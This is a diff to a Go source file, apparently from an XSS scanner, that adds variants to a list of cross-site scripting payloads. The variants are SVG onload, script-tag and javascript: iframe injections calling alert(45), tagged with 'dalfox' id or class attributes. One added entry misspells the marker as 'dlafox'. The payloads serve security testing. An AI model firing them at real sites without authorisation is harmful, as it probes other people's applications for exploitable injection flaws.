@@ -3,12 +3,22 @@ package core
 func getCommonPayload() []string {
 	payload := []string{
 		"\"><SvG/onload=alert(45)>",
+		"\"><SvG/onload=alert(45) id=dalfox>",
+		"\"><SvG/onload=alert(45) class=dlafox>",
 		"'><sVg/onload=alert(45)>",
+		"'><sVg/onload=alert(45) id=dalfox>",
+		"'><sVg/onload=alert(45) class=dalfox>",
 		"</ScriPt><sCripT>alert(45)</sCriPt>",
-		"</scRipt><scRipT>alert(45)</sCRipt>",
-		"</sCript><ScriPt>alert(45)</ScrIpt>",
+		"</ScriPt><sCripT id=dalfox>alert(45)</sCriPt>",
+		"</ScriPt><sCripT class=dalfox>alert(45)</sCriPt>",
 		"\"><iFrAme/src=jaVascRipt:alert(45)></iFramE>",
+		"\"><iFrAme/src=jaVascRipt:alert(45) id=dalfox></iFramE>",
+		"\"><iFrAme/src=jaVascRipt:alert(45) class=dalfox></iFramE>",
 		"'><iFrAme/src=jaVascRipt:alert(45)></iFramE>",
+		"'><iFrAme/src=jaVascRipt:alert(45) id=dalfox></iFramE>",
+		"'><iFrAme/src=jaVascRipt:alert(45) class=dalfox></iFramE>",
+		"\">asd",
+		"'>asd",
 	}
 	return payload
 }
